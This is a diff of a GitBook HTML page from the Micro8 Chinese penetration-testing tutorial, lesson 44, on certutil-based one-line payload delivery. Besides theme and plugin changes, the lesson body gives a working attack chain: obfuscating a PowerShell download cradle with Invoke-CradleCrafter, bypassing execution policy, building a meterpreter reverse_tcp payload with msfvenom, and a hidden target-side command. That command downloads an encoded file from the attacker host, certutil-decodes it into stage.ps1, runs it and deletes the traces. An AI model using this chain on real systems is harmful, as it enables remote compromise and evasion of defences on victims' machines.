@@ -1,14 +1,14 @@
 
 <!DOCTYPE HTML>
-<html lang="" >
+<html lang="zh-hans" >
     <head>
         <meta charset="UTF-8">
         <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
-        <title>第四十四课：ertutil一句话下载payload补充 · GitBook</title>
+        <title>第四十四课：ertutil一句话下载payload补充 · Micro8 系列教程</title>
         <meta http-equiv="X-UA-Compatible" content="IE=edge" />
         <meta name="description" content="">
         <meta name="generator" content="GitBook 3.2.3">
-        
+        <meta name="author" content="Micro8 系列作者">
         
         
     
@@ -17,17 +17,33 @@
     
             
                 
-                <link rel="stylesheet" href="../gitbook/gitbook-plugin-highlight/website.css">
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search-plus/search.css">
                 
             
                 
-                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search/search.css">
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-prism/prism-darcula.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-splitter/splitter.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-tbfed-pagefooter/footer.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-donate/plugin.css">
                 
             
                 
                 <link rel="stylesheet" href="../gitbook/gitbook-plugin-fontsettings/website.css">
                 
             
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-theme-comscore/test.css">
+                
+            
         
 
     
@@ -47,6 +63,7 @@
     
 
         
+    
     
     
     <meta name="HandheldFriendly" content="true"/>
@@ -63,6 +80,17 @@
     <link rel="prev" href="43_js一句话下载payload.html" />
     
 
+    <style>
+    @media only screen and (max-width: 640px) {
+        .book-header .hidden-mobile {
+            display: none;
+        }
+    }
+    </style>
+    <script>
+        window["gitbook-plugin-github-buttons"] = {"repo":"https://github.com/Micropoor/Micro8","types":["star","watch","fork"],"size":"small"};
+    </script>
+
     </head>
     <body>
         
@@ -71,7 +99,7 @@
         
             
 <div id="book-search-input" role="search">
-    <input type="text" placeholder="Type to search" />
+    <input type="text" placeholder="输入并搜索" />
 </div>
 
             
@@ -82,7 +110,21 @@
 <ul class="summary">
     
     
+    
+        
+        <li>
+            <a href="https://micropoor.blogspot.com" target="_blank" class="custom-link">Micropoor</a>
+        </li>
+    
+        
+        <li>
+            <a href="https://github.com/micro8" target="_blank" class="custom-link">Github Micro8</a>
+        </li>
+    
+    
 
+    
+    <li class="divider"></li>
     
 
     
@@ -1785,7 +1827,7 @@
 
     <li>
         <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
-            Published with GitBook
+            本书使用 GitBook 发布
         </a>
     </li>
 </ul>
@@ -1818,29 +1860,29 @@
                     <div class="page-wrapper" tabindex="-1" role="main">
                         <div class="page-inner">
                             
-<div id="book-search-results">
+<div class="search-plus" id="book-search-results">
     <div class="search-noresults">
     
                                 <section class="normal markdown-section">
                                 
                                 <p>&#x7B2C;&#x516B;&#x5B63;&#x4E2D;&#x63D0;&#x5230;&#x4E86; certutil &#x7684;&#x52A0;&#x5BC6;&#x4E0E;&#x89E3;&#x5BC6;&#x3002;  </p>
-<pre><code class="lang-bash">C:\&gt;certutil -encode c:\downfile.vbs downfile.bat
+<pre class="language-"><code class="lang-bash">C:\<span class="token operator">&gt;</span>certutil -encode c:\downfile.vbs downfile.bat
 </code></pre>
 <p>&#x800C;&#x914D;&#x5408; powershell &#x7684;&#x5185;&#x5B58;&#x52A0;&#x8F7D;&#xFF0C;&#x5219;&#x53EF;&#x628A; certutil &#x53D1;&#x6325;&#x66F4;&#x5F3A;&#x5927;&#x3002;</p>
 <p><strong>&#x9776;&#x673A;&#xFF1A;windows 2012</strong></p>
 <p>&#x800C;&#x4ECA;&#x5929;&#x9700;&#x8981;&#x7684;&#x662F;&#x4E00;&#x6B3E; powershell &#x7684;&#x6DF7;&#x6DC6;&#x6846;&#x67B6;&#x7684;&#x914D;&#x5408;<br><a href="https://github.com/danielbohannon/Invoke-CradleCrafter" target="_blank">https://github.com/danielbohannon/Invoke-CradleCrafter</a></p>
 <p>&#x4F7F;&#x7528;&#x65B9;&#x6CD5;&#xFF1A;</p>
-<pre><code class="lang-bash">Import-Module ./Invoke-CradleCrafter.psd1 Invoke-CradleCrafter
+<pre class="language-"><code class="lang-bash">Import-Module ./Invoke-CradleCrafter.psd1 Invoke-CradleCrafter
 </code></pre>
 <p><img src="media/c62807cec766f0f6c92c2d821cd6ede3.jpg" alt=""></p>
 <p><img src="media/5fd8400f05ad1fe156649bb7d4ab2726.jpg" alt=""></p>
 <p>&#x5982;&#x679C;&#x5728;&#x52A0;&#x8F7D; powershell &#x811A;&#x672C;&#x7684;&#x65F6;&#x5019;&#x63D0;&#x793A;&#xFF1A;<strong>powershell
 &#x8FDB;&#x884C;&#x6570;&#x5B57;&#x7B7E;&#x8FD0;&#x884C;&#x8BE5;&#x811A;&#x672C;&#x3002;</strong>
 &#x5219;&#x5148;&#x6267;&#x884C;&#xFF1A;</p>
-<pre><code class="lang-bash"><span class="hljs-built_in">set</span>-executionpolicy Bypass
+<pre class="language-"><code class="lang-bash">set-executionpolicy Bypass
 </code></pre>
 <p>&#x751F;&#x6210;payload&#xFF1A;&#xFF08;&#x6709;&#x5173;&#x751F;&#x6210;payload&#xFF0C;&#x4F1A;&#x5728;&#x672A;&#x6765;&#x7684;&#x7CFB;&#x5217;&#x4E2D;&#x8BB2;&#x5230;&#xFF09;</p>
-<pre><code class="lang-bash">root@John:/tmp<span class="hljs-comment"># msfvenom &#x2010;p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=53 &#x2010;e cmd/powershell_base64 &#x2010;f psh &#x2010;o Micropoor.txt</span>
+<pre class="language-"><code class="lang-bash">root@John:/tmp<span class="token comment"># msfvenom &#x2010;p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=53 &#x2010;e cmd/powershell_base64 &#x2010;f psh &#x2010;o Micropoor.txt</span>
 </code></pre>
 <p><img src="media/316a532d526b20050d34d02f8f06e952.jpg" alt=""></p>
 <p><img src="media/cfa22fb95c6b008829035e91928f47db.jpg" alt=""></p>
@@ -1854,12 +1896,14 @@
 <p><strong>&#x6DF7;&#x6DC6;&#x5185;&#x5BB9;&#x4FDD;&#x5B58;txt&#xFF0C;&#x540E;&#x8FDB;&#x884C;encode</strong><br><img src="media/17b242fcc60d1fa5eb54d8f2c6268331.jpg" alt=""></p>
 <p>&#x628A; cer.cer &#x4E0E; Micropoo.txt &#x653E;&#x7F6E;&#x540C;&#x4E00;&#x76EE;&#x5F55;&#x4E0B;&#x3002;  </p>
 <p><strong>&#x76EE;&#x6807;&#x673A;&#x6267;&#x884C;&#xFF1A;</strong>  </p>
-<pre><code class="lang-bash">powershell.exe &#x2010;W<span class="hljs-keyword">in</span> hiddeN &#x2010;Exec ByPasS add&#x2010;content &#x2010;path %APPDATA%\\cer.cer (New&#x2010;Object Net.WebClient).DownloadString(<span class="hljs-string">&apos;http://192.168.1.5/cer.cer&apos;</span>); certutil &#x2010;decode %APPDATA%\cer.cer %APPDATA%\stage.ps1 &amp; start /b cmd /c powershell.exe &#x2010;Exec Bypass &#x2010;NoExit &#x2010;File %APPDATA%\stage.ps1 &amp; start /b cmd /c del %APPDATA%\cer.cer
+<pre class="language-"><code class="lang-bash">powershell.exe &#x2010;Win hiddeN &#x2010;Exec ByPasS add&#x2010;content &#x2010;path %APPDATA%\\cer.cer <span class="token punctuation">(</span>New&#x2010;Object Net.WebClient<span class="token punctuation">)</span>.DownloadString<span class="token punctuation">(</span><span class="token string">&apos;http://192.168.1.5/cer.cer&apos;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> certutil &#x2010;decode %APPDATA%\cer.cer %APPDATA%\stage.ps1 <span class="token operator">&amp;</span> start /b cmd /c powershell.exe &#x2010;Exec Bypass &#x2010;NoExit &#x2010;File %APPDATA%\stage.ps1 <span class="token operator">&amp;</span> start /b cmd /c del %APPDATA%\cer.cer
 </code></pre>
 <blockquote>
 <p>  Micropoor</p>
 </blockquote>
-
+<footer class="page-footer"><span class="copyright">Copyright &#xA9; Micro8 2018 all right reserved&#xFF0C;powered by Gitbook</span><span class="footer-modification">&#x4FEE;&#x8BA2;&#x65F6;&#x95F4;&#xFF1A;
+2019-02-23 17:52
+</span></footer>
                                 
                                 </section>
                             
@@ -1902,7 +1946,7 @@
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"title":"第四十四课：ertutil一句话下载payload补充","level":"1.4.44","depth":2,"next":{"title":"第四十五课：解决bat一句话下载payload黑窗","level":"1.4.45","depth":2,"path":"Chapter1/45_解决bat一句话下载payload黑窗.md","ref":"Chapter1/45_解决bat一句话下载payload黑窗.md","articles":[]},"previous":{"title":"第四十三课：js一句话下载payload","level":"1.4.43","depth":2,"path":"Chapter1/43_js一句话下载payload.md","ref":"Chapter1/43_js一句话下载payload.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":[],"pluginsConfig":{"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"Chapter1/44_ertutil一句话下载payload补充.md","mtime":"2019-02-23T09:52:00.749Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2019-02-25T04:00:06.266Z"},"basePath":"..","book":{"language":""}});
+            gitbook.page.hasChanged({"page":{"title":"第四十四课：ertutil一句话下载payload补充","level":"1.4.44","depth":2,"next":{"title":"第四十五课：解决bat一句话下载payload黑窗","level":"1.4.45","depth":2,"path":"Chapter1/45_解决bat一句话下载payload黑窗.md","ref":"Chapter1/45_解决bat一句话下载payload黑窗.md","articles":[]},"previous":{"title":"第四十三课：js一句话下载payload","level":"1.4.43","depth":2,"path":"Chapter1/43_js一句话下载payload.md","ref":"Chapter1/43_js一句话下载payload.md","articles":[]},"dir":"ltr"},"config":{"plugins":["-lunr","-search","search-plus","-highlight","prism","theme-comscore","splitter","-sharing","sharing-plus","-expandable-chapters-small","simple-page-toc","github","github-buttons","tbfed-pagefooter","donate","ga"],"root":".","styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"tbfed-pagefooter":{"copyright":"Copyright © Micro8 2018","modify_label":"修订时间：","modify_format":"YYYY-MM-DD HH:mm"},"prism":{"css":["prism-themes/themes/prism-darcula.css"]},"github":{"url":"https://github.com/micro8"},"simple-page-toc":{"maxDepth":3,"skipFirstH1":true},"splitter":{},"sharing-plus":{"qq":false,"all":["facebook","google","twitter","instapaper","linkedin","pocket","stumbleupon"],"douban":false,"facebook":true,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":true,"messenger":false,"line":false,"vk":false,"pocket":true,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"donate":{"alipay":"","alipayText":"支付宝打赏","button":"赞赏码","title":"有读者问赞赏码，如下，自愿：","wechat":"./dashang.png","wechatText":""},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-comscore":{},"github-buttons":{"repo":"https://github.com/Micropoor/Micro8","types":["star","watch","fork"],"size":"small"},"ga":{"configuration":"auto","token":"UA-135003278-1"},"sharing":{"qq":false,"all":["facebook","google","twitter","weibo","instapaper","linkedin","pocket","stumbleupon"],"douban":false,"facebook":false,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":false,"messenger":false,"line":false,"vk":false,"pocket":false,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"search-plus":{}},"theme":"default","author":"Micro8 系列作者","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"Micro8 系列教程","language":"zh-hans","links":{"sidebar":{"Micropoor":"https://micropoor.blogspot.com","Github Micro8":"https://github.com/micro8"}},"gitbook":"*","description":"Micro8"},"file":{"path":"Chapter1/44_ertutil一句话下载payload补充.md","mtime":"2019-02-23T09:52:00.749Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2019-02-25T13:55:17.972Z"},"basePath":"..","book":{"language":""}});
         });
     </script>
 </div>
@@ -1912,27 +1956,43 @@
     <script src="../gitbook/theme.js"></script>
     
         
-        <script src="../gitbook/gitbook-plugin-search/search-engine.js"></script>
+        <script src="../gitbook/gitbook-plugin-search-plus/jquery.mark.min.js"></script>
         
     
         
-        <script src="../gitbook/gitbook-plugin-search/search.js"></script>
+        <script src="../gitbook/gitbook-plugin-search-plus/search.js"></script>
         
     
         
-        <script src="../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
+        <script src="../gitbook/gitbook-plugin-splitter/splitter.js"></script>
         
     
         
-        <script src="../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
+        <script src="../gitbook/gitbook-plugin-sharing-plus/buttons.js"></script>
         
     
         
-        <script src="../gitbook/gitbook-plugin-sharing/buttons.js"></script>
+        <script src="../gitbook/gitbook-plugin-github/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-github-buttons/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-donate/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-ga/plugin.js"></script>
         
     
         
         <script src="../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-theme-comscore/test.js"></script>
         
     
 
